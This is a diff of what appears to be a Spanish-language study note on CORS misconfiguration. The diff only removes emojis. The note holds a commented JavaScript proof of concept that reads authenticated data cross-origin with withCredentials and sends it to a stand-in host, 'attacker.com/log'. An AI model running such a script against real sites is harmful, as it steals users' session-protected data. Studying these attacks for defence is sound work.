@@ -63,14 +63,14 @@ req.send();
 ```
 
 ```javascript
-// 🧠 Explicación detallada del script CORS con robo de datos
+// Explicación detallada del script CORS con robo de datos
 
 // Este script utiliza XMLHttpRequest para hacer una solicitud entre sitios (cross-origin request)
 // a una web vulnerable con CORS mal configurado.
 
 var req = new XMLHttpRequest();
 
-// 🔍 req.onload:
+// req.onload:
 // Esta función se ejecuta cuando la respuesta del servidor vulnerable llega.
 req.onload = function() {
     // 🔒 Envío de datos robados:
@@ -79,10 +79,10 @@ req.onload = function() {
     location = 'https://attacker.com/log?data=' + this.responseText;
 };
 
-// ✈️ Configuramos la solicitud para apuntar a la información sensible
+// Configuramos la solicitud para apuntar a la información sensible
 req.open('GET', 'https://vulnerable-website.com/sensitive-data', true);
 
-// ⛔️ withCredentials:
+// withCredentials:
 // Esto indica que la solicitud debe incluir cookies de sesión, lo cual es necesario
 // para acceder a datos autenticados en el sitio vulnerable.
 req.withCredentials = true;
@@ -91,14 +91,14 @@ req.withCredentials = true;
 req.send();
 
 /*
-📅 Resumen del flujo:
+ Resumen del flujo:
 1. El navegador del usuario carga esta página (en el dominio del atacante).
 2. El script hace una solicitud GET a un sitio vulnerable con CORS.
 3. Si el sitio vulnerable permite origen cruzado (y Access-Control-Allow-Credentials: true),
    la respuesta se recibe en el navegador.
 4. El script redirige al usuario a attacker.com incluyendo los datos robados en la URL.
 
-⚠️ Este tipo de ataque es posible sólo si:
+Este tipo de ataque es posible sólo si:
 - La web vulnerable permite el origen cruzado de forma laxa.
 - Se permite el uso de cookies mediante withCredentials + Access-Control-Allow-Credentials: true.
 */
